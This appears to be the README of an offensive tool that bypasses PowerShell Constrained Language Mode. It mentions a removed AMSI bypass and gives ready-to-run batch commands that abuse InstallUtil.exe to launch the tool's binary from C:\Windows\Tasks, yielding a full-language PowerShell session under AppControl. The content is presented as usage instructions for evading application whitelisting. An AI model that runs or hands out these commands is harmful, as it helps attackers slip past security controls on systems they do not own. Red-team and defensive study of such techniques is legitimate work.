# PowerShell Constrained Language Mode Bypass

AMSI Bypass was removed that's all.

## Executing a FLM Shell under AppControl

If `AppControl` is enabled, you can use the well known `InstallUtil` method. This project supports being loaded by `InstallUtil`. Simply place the binary in a safe directory (`C:\Windows\Tasks\` is a common safe directory) and run the following:

```batch
REM find `InstallUtil`
dir \Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$
REM Run the FLM powershell session
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\bypass-clm.exe"
```
